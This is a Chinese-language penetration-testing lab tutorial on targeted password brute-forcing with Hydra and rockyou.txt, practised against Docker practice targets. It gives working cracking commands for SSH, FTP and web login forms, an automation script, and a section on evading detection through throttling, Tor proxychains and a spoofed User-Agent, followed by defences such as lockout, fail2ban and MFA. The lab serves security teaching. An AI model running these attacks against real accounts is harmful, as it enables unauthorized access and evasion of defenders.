# 🎯 实验02：破解特定用户账户

> **难度**：⭐⭐⭐ 初级  
> **预计时间**：45分钟  
> **工具**：Hydra、rockyou.txt 字典

---

## 🎯 学习目标

通过本实验，你将学会：

- ✅ 理解定向暴力破解的原理和应用场景
- ✅ 掌握针对单一用户的 Hydra 攻击方法
- ✅ 学会使用大型密码字典（rockyou.txt）
- ✅ 优化 Hydra 参数以提高破解效率
- ✅ 理解账户锁定策略的原理和配置

---

## 📖 背景知识

### 定向暴力破解的场景

在实际渗透测试中，经常会遇到以下情况：

1. **已知用户名，未知密码**
   - 通过信息收集获得用户名（如公司邮箱、GitHub 用户名、社交媒体）
   - 通过泄露数据获得用户名列表
   - 通过 OSINT（开源情报）收集到员工姓名

2. **为什么选择定向攻击？**
   - 针对性强，成功率更高
   - 减少网络流量，降低被检测风险
   - 可以使用更大的密码字典
   - 耗时更短（相比暴力枚举所有用户）

### Hydra 参数优化

针对定向破解，需要优化以下参数：

| 参数 | 推荐值 | 说明 |
|------|--------|------|
| `-t` | 4-16 | 线程数，太高容易被检测/封禁 |
| `-w` | 30-60 | 连接超时时间（秒） |
| `-W` | 30-60 | 登录超时时间（秒） |
| `-f` | - | 找到第一个密码后立即停止 |
| `-v` / `-V` | - | 显示详细过程，便于调试 |
| `--delay` | 1-5 | 每次尝试之间的延迟（秒），避免被封 |

### rockyou.txt 字典

**rockyou.txt** 是 Kali Linux 自带的著名密码字典，来源于 2009 年 RockYou 公司的数据泄露事件，包含约 **1430 万个真实密码**。

```bash
# 查看字典信息
ls -lh /usr/share/wordlists/rockyou.txt
# 约 133MB，14344391 行

# 如果文件是 .gz 压缩格式，需要先解压
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
```

**字典使用技巧：**

```bash
# 查看字典前 10 行
head -n 10 /usr/share/wordlists/rockyou.txt

# 统计字典行数
wc -l /usr/share/wordlists/rockyou.txt

# 根据密码长度过滤（例如：只尝试 8-12 位的密码）
awk 'length($0) >= 8 && length($0) <= 12' /usr/share/wordlists/rockyou.txt > filtered.txt

# 根据密码复杂度过滤（包含大小写+数字+符号）
grep -E '[A-Z]' /usr/share/wordlists/rockyou.txt | grep -E '[a-z]' | grep -E '[0-9]' > complex.txt
```

### ⚠️ 法律声明

> **本实验仅供学习使用！**
> - 只能对**自己拥有或授权的系统**进行破解测试
> - 未经授权对他人系统进行暴力破解属于**违法行为**
> - 建议在本地虚拟机或 Docker 靶机环境中练习
> - 使用大型字典时，注意对目标系统的影响

---

## 🔧 环境要求

### 系统要求

```bash
# 检查 Hydra 是否已安装
hydra -h

# 如未安装，执行：
sudo apt install -y hydra

# 检查 rockyou.txt 字典是否存在
ls -lh /usr/share/wordlists/rockyou.txt

# 如果不存在，安装字典包
sudo apt install -y wordlists
```

### 准备靶机

```bash
# 启动 Metasploitable2 靶机（Docker）
docker run -d -p 22:22 -p 21:21 -p 80:80 --name target tleemcjr/metasploitable2

# 或者使用 DVWA（Damn Vulnerable Web Application）
docker run -d -p 80:80 --name dvwa vulnerables/web-dvwa

# 查看靶机 IP
docker inspect target | grep IPAddress
```

---

## 👨‍💻 实验步骤

### Step 1：信息收集 - 确定目标用户名

在实际攻击中，首先需要进行信息收集：

```bash
# 场景1：通过 SSH banner 信息收集
nc 192.168.1.100 22
# 可能会显示：SSH-2.0-OpenSSH_5.3p1 Debian-3ubuntu7

# 场景2：通过 FTP 匿名登录收集用户列表
ftp 192.168.1.100
# 尝试匿名登录：用户名 ftp，密码 ftp 或 anonymous

# 场景3：通过 HTTP 页面收集用户名
curl -s http://192.168.1.100 | grep -i "user\|login\|admin"

# 场景4：使用 Nmap 脚本枚举用户
nmap -p 22 --script ssh-enum-users --script-args userdb=users.txt 192.168.1.100
```

**假设通过信息收集，我们确定了目标用户名：`admin`**

---

### Step 2：准备密码字典

#### 选项A：使用完整 rockyou.txt（耗时较长）

```bash
# 解压 rockyou.txt（如果还是压缩状态）
sudo gunzip /usr/share/wordlists/rockyou.txt.gz

# 检查字典
head -n 20 /usr/share/wordlists/rockyou.txt
# 输出示例：
# 123456
# 12345
# 123456789
# password
# iloveyou
# ...
```

#### 选项B：创建针对性小字典（推荐用于实验）

```bash
# 创建包含常见密码的小字典
cat > custom_pass.txt << EOF
password
password123
123456
admin
admin123
root
toor
qwerty
letmein
1234
12345
123456789
1234567890
password1
12345678
qwerty123
abc123
monkey
master
dragon
login
princess
football
shadow
sunshine
trustno1
iloveyou
batman
access
hello
charlie
donald
123123
adminadmin
1234
password1234
EOF

# 查看字典
wc -l custom_pass.txt  # 统计行数
cat custom_pass.txt    # 查看内容
```

#### 选项C：过滤 rockyou.txt（平衡方案）

```bash
# 提取 rockyou.txt 中最常见的 10000 个密码
head -n 10000 /usr/share/wordlists/rockyou.txt > top_10000.txt

# 或者根据密码长度过滤（8-16位）
awk 'length($0) >= 8 && length($0) <= 16' /usr/share/wordlists/rockyou.txt > filtered_8-16.txt

# 查看过滤后的字典大小
wc -l filtered_8-16.txt
```

---

### Step 3：使用 Hydra 进行定向破解

#### 基础命令格式

```bash
# 基本语法
hydra -l <用户名> -P <密码字典> <目标IP> <服务>

# 示例：破解 SSH 服务
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.100 ssh -t 4 -V
```

#### 参数详解

```bash
hydra -l admin \                  # 指定用户名
       -P /usr/share/wordlists/rockyou.txt \  # 指定密码字典
       192.168.1.100 \            # 目标 IP
       ssh \                      # 目标服务
       -t 4 \                     # 线程数（并发数）
       -V \                       # 显示每次尝试
       -f \                       # 找到密码后立即停止
       -w 30 \                    # 连接超时 30 秒
       -W 30 \                    # 登录超时 30 秒
       --delay 1 \                # 每次尝试间隔 1 秒
       -o result.txt              # 保存结果到文件
```

---

### Step 4：实战演练 - 破解 SSH 服务

```bash
# 1. 使用小字典快速测试
hydra -l admin -P custom_pass.txt 192.168.1.100 ssh -t 4 -V -f

# 2. 使用过滤后的 rockyou.txt
hydra -l admin -P filtered_8-16.txt 192.168.1.100 ssh -t 4 -V -f

# 3. 使用完整 rockyou.txt（可能需要数小时）
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.100 ssh -t 8 -V -f -o ssh_cracked.txt

# 4. 查看结果
cat ssh_cracked.txt
```

**预期输出示例：**

```
Hydra v9.4 (c) 2023 by van Hauser/THC

[DATA] attacking ssh://192.168.1.100:22/
[ssh] host: 192.168.1.100   login: admin   password: password123
[STATUS] attack finished for 192.168.1.100 (waiting for children to finish)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished
```

---

### Step 5：实战演练 - 破解 FTP 服务

```bash
# 破解 FTP 服务
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.100 ftp -t 4 -V -f

# 如果 FTP 使用非默认端口
hydra -l admin -P custom_pass.txt 192.168.1.100 ftp -s 2121 -t 4 -V

# 尝试匿名登录
hydra -l ftp -p ftp 192.168.1.100 ftp -V
hydra -l anonymous -p anonymous 192.168.1.100 ftp -V
```

---

### Step 6：实战演练 - 破解 HTTP 表单

```bash
# DVWA 登录页面破解（低安全级别）
hydra -l admin -P custom_pass.txt 192.168.1.100 http-post-form \
  "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed" \
  -V -f

# 参数说明：
# /dvwa/login.php                    → 登录页面路径
# username=^USER^&password=^PASS^    → POST 数据，^USER^ 和 ^PASS^ 是占位符
# :Login failed                      → 登录失败的提示信息
# -V                                 → 显示详细过程
# -f                                 → 找到密码后停止

# 如果网站使用 Cookie 或 Token
hydra -l admin -P custom_pass.txt 192.168.1.100 http-post-form \
  "/login.php:user=^USER^&pass=^PASS^&csrf=abc123:Invalid password" \
  -V -H "Cookie: PHPSESSID=xyz789"
```

---

### Step 7：优化 Hydra 性能

#### 线程数优化

```bash
# 测试不同线程数的速度
for t in 2 4 8 16 32; do
  echo "=== 测试线程数: $t ==="
  time hydra -l admin -P custom_pass.txt 192.168.1.100 ssh -t $t -f
done

# 推荐设置：
# - 本地靶机：-t 16-32
# - 远程目标：-t 4-8（避免被封）
# - 高延迟网络：-t 2-4
```

#### 使用分片技术处理大字典

```bash
# 将 rockyou.txt 分成 10 个文件
split -l 1434439 /usr/share/wordlists/rockyou.txt part_

# 或者按行数分割
split -n 10 /usr/share/wordlists/rockyou.txt part_

# 逐个尝试
for part in part_*; do
  echo "=== 正在尝试 $part ==="
  hydra -l admin -P $part 192.168.1.100 ssh -t 4 -f
  if [ -f result.txt ]; then
    echo "密码已找到！"
    break
  fi
done
```

---

### Step 8：避免被检测的技巧

#### 1. 降低请求频率

```bash
# 增加延迟
hydra -l admin -P custom_pass.txt 192.168.1.100 ssh -t 1 --delay 5 -V

# 使用随机延迟
hydra -l admin -P custom_pass.txt 192.168.1.100 ssh -t 1 --delay 1-3 -V
```

#### 2. 使用代理链

```bash
# 配置 ProxyChains
sudo nano /etc/proxychains.conf
# 添加代理服务器：
# socks5  127.0.0.1 9050  (Tor)
# http    192.168.1.200 8080

# 通过代理运行 Hydra
proxychains hydra -l admin -P custom_pass.txt 192.168.1.100 ssh -t 1 -V
```

#### 3. 伪造 User-Agent（针对 HTTP）

```bash
# 添加自定义 HTTP Header
hydra -l admin -P custom_pass.txt 192.168.1.100 http-post-form \
  "/login.php:user=^USER^&pass=^PASS^:Invalid" \
  -V -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
```

---

## ✅ 验证检查

完成实验后，请确认你能回答以下问题：

- [ ] 定向暴力破解和暴力枚举有什么区别？
- [ ] 如何针对单一用户优化 Hydra 参数？
- [ ] rockyou.txt 字典包含多少个密码？如何过滤它？
- [ ] 如何避免 Hydra 被目标系统的入侵检测系统（IDS）发现？
- [ ] `-t` 参数设置过高会有什么问题？

---

## 💡 进阶挑战

### 挑战1：使用 Crunch 生成智能字典

```bash
# 安装 Crunch
sudo apt install -y crunch

# 生成基于公司名称的字典
crunch 6 10 -t admin%%% -o admin_dict.txt
# % 代表数字，会生成 admin000 到 admin999

# 生成包含特殊字符的字典
crunch 8 8 -t ^^^^%%%%  # ^ 代表大写字母
# 会生成类似 ADMIN123 的密码

# 结合规则生成字典
crunch 6 8 -f /usr/share/crunch/charset.lst mixalpha-numeric -o crunch_dict.txt
```

### 挑战2：使用 CeWL 生成定制字典

```bash
# 安装 CeWL
sudo apt install -y cewl

# 从目标网站抓取关键词生成字典
cewl -w cewl_dict.txt -d 2 -m 5 http://192.168.1.100/

# 参数说明：
# -w cewl_dict.txt  → 输出文件
# -d 2              → 爬取深度
# -m 5              → 最小单词长度
```

### 挑战3：组合多个字典

```bash
# 合并多个字典并去重
cat custom_pass.txt filtered_8-16.txt cewl_dict.txt | sort | uniq > combined.txt

# 使用组合字典进行破解
hydra -l admin -P combined.txt 192.168.1.100 ssh -t 4 -V -f
```

### 挑战4：编写自动化脚本

```bash
# 创建自动化破解脚本
cat > auto_hydra.sh << 'EOF'
#!/bin/bash

TARGET=$1
USERNAME=$2
WORDLIST=$3

echo "[*] 开始针对 $TARGET 的 $USERNAME 账户进行破解"
echo "[*] 使用字典: $WORDLIST"

# 先测试 SSH
echo "[*] 测试 SSH 服务..."
hydra -l $USERNAME -P $WORDLIST $TARGET ssh -t 4 -V -f -o ssh_result.txt

# 如果 SSH 失败，测试 FTP
if [ ! -f ssh_result.txt ]; then
  echo "[*] SSH 失败，测试 FTP 服务..."
  hydra -l $USERNAME -P $WORDLIST $TARGET ftp -t 4 -V -f -o ftp_result.txt
fi

# 查看结果
if [ -f ssh_result.txt ]; then
  echo "[+] 成功！SSH 密码已保存到 ssh_result.txt"
  cat ssh_result.txt
elif [ -f ftp_result.txt ]; then
  echo "[+] 成功！FTP 密码已保存到 ftp_result.txt"
  cat ftp_result.txt
else
  echo "[-] 未能破解密码"
fi
EOF

# 赋予执行权限
chmod +x auto_hydra.sh

# 使用脚本
./auto_hydra.sh 192.168.1.100 admin /usr/share/wordlists/rockyou.txt
```

---

## 🛡️ 防御措施（如何防范定向暴力破解）

了解攻击方法后，系统管理员应采取以下防御措施：

### 1. 账户锁定策略

**原理**：当用户连续多次输入错误密码时，暂时锁定账户。

#### Linux 系统（使用 PAM）

```bash
# 编辑 PAM 配置文件
sudo nano /etc/pam.d/common-auth

# 添加以下内容（失败3次锁定，锁定时间600秒）
auth required pam_tally2.so deny=3 unlock_time=600 onerr=fail

# 查看锁定状态
pam_tally2 --user admin

# 手动解锁
pam_tally2 --user admin --reset
```

#### Windows 系统

```
组策略设置路径：
计算机配置 → Windows 设置 → 安全设置 → 账户策略 → 账户锁定策略

设置：
- 账户锁定阈值：3 次无效登录
- 账户锁定时间：30 分钟
- 重置账户锁定计数器：30 分钟
```

---

### 2. 延迟响应（Tarpitting）

**原理**：每次登录失败后，增加响应延迟，大大降低暴力破解速度。

#### SSH 延迟配置

```bash
# 编辑 sshd_config
sudo nano /etc/ssh/sshd_config

# 添加以下配置
MaxAuthTries 3          # 最大尝试次数
LoginGraceTime 60       # 登录超时时间
MaxStartups 10:30:60    # 最大并发未认证连接

# 使用 fail2ban 实现延迟
sudo apt install -y fail2ban

# 配置 fail2ban
sudo cat > /etc/fail2ban/jail.local << EOF
[sshd]
enabled = true
maxretry = 3
bantime = 3600
findtime = 600
EOF

sudo systemctl restart fail2ban
```

---

### 3. 验证码（CAPTCHA）

**原理**：在登录页面添加验证码，防止自动化工具暴力破解。

#### Web 应用示例（PHP）

```php
// 登录页面添加验证码
session_start();

if ($_POST['captcha'] != $_SESSION['captcha']) {
    die("验证码错误！");
}

// 生成验证码
$_SESSION['captcha'] = rand(1000, 9999);
```

---

### 4. 多因素认证（MFA/2FA）

**原理**：即使密码被破解，攻击者仍需第二个验证因素（如手机验证码、Google Authenticator）。

#### SSH 启用 Google Authenticator

```bash
# 安装 Google Authenticator
sudo apt install -y libpam-google-authenticator

# 为用户配置
google-authenticator

# 编辑 SSH PAM 配置
sudo nano /etc/pam.d/sshd

# 添加以下行
auth required pam_google_authenticator.so

# 编辑 sshd_config
sudo nano /etc/ssh/sshd_config

# 修改以下配置
ChallengeResponseAuthentication yes

# 重启 SSH
sudo systemctl restart sshd
```

---

### 5. IP 白名单和速率限制

#### 使用防火墙限制 SSH 访问

```bash
# 只允许特定 IP 访问 SSH
sudo iptables -A INPUT -p tcp --dport 22 -s 192.168.1.0/24 -j ACCEPT
sudo iptables -A INPUT -p tcp --dport 22 -j DROP

# 使用 rate limit 限制连接频率
sudo iptables -A INPUT -p tcp --dport 22 -m state --state NEW -m limit --limit 3/min -j ACCEPT
```

#### Nginx 速率限制（针对 Web 登录）

```nginx
# 在 nginx.conf 中配置
http {
    limit_req_zone $binary_remote_addr zone=login:10m rate=1r/m;

    server {
        location /login.php {
            limit_req zone=login burst=5;
            # ... 其他配置
        }
    }
}
```

---

### 6. 强密码策略

#### Linux 密码策略

```bash
# 编辑密码策略配置
sudo nano /etc/security/pwquality.conf

# 设置密码复杂度要求
minlen = 12          # 最小长度 12
minclass = 4         # 至少包含4类字符（大写、小写、数字、符号）
maxrepeat = 3        # 最多连续重复3次
maxclassrepeat = 4   # 同类字符最多连续4次

# 设置密码过期策略
sudo chage -M 90 admin   # 密码90天后过期
sudo chage -W 7 admin    # 提前7天警告
```

#### 企业级密码管理器

推荐使用密码管理器生成和存储强密码：

- **KeePass** / **KeePassXC**（开源，本地存储）
- **Bitwarden**（开源，支持自托管）
- **1Password**（商业软件）
- **LastPass**（商业软件）

---

## 📚 参考资源

- [Hydra 官方 GitHub](https://github.com/vanhauser-thc/thc-hydra)
- [THC Hydra 使用指南](https://www.hackingarticles.in/comprehensive-guide-on-hydra/)
- [rockyou.txt 字典下载](https://github.com/brannondorsey/naive-hashcat/releases/tag/data)
- [Fail2Ban 官方文档](https://www.fail2ban.org/)
- [OWASP 暴力破解防御指南](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [PAM 配置指南](https://linux.die.net/HOWTO/PAM-HOWTO/)
- [Crunch 字典生成器](https://sourceforge.net/projects/crunch-wordlist/)
- [CeWL 字典生成器](https://github.com/digininja/CeWL)

---

## 📝 实验笔记

> 在这里记录你的实验过程、遇到的问题和解决方案：

```
实验日期：_______________
目标IP：_________________
目标用户名：_____________
使用字典：_______________
字典大小（密码数量）：_____
破解服务：_______________
优化参数：_______________
  - 线程数 (-t)：________
  - 超时时间 (-w/-W)：___
  - 延迟 (--delay)：_____
破解结果：_______________
  - 密码：_______________
  - 耗时：_______________
遇到的问题：_____________
解决方案：_______________
防御措施测试：___________
  - 是否触发账户锁定？___
  - 是否被 IP 封禁？_____
  - 其他观察：___________
```

---

## 🔍 知识拓展

### 密码强度评估

了解密码强度对于防御暴力破解至关重要：

```bash
# 使用 hashcat 进行密码强度评估
hashcat --benchmark  # 测试你的 GPU 破解速度

# 估算破解时间
# 假设密码复杂度：大小写+数字+符号（约80个字符）
# 密码长度：8位
# 组合数：80^8 ≈ 1.68 × 10^15

# 如果你的 GPU 速度为 10^9 次/秒（10亿次/秒）
# 破解时间：1.68 × 10^15 / 10^9 ≈ 1.68 × 10^6 秒 ≈ 19.4 天

# 密码长度增加到 12 位
# 组合数：80^12 ≈ 6.87 × 10^22
# 破解时间：6.87 × 10^22 / 10^9 ≈ 6.87 × 10^13 秒 ≈ 2.18 百万年
```

### 密码哈希类型识别

在实战中，可能需要识别密码哈希类型：

```bash
# 使用 hashid 识别哈希类型
hashid -m '$1$abc123$def456...'

# 常见哈希类型：
# $1$          → MD5 (Linux)
# $5$          → SHA-256 (Linux)
# $6$          → SHA-512 (Linux)
# NT           → NTLM (Windows)
# *A*          → Kerberos
```

---

*最后更新：2026-05-30*
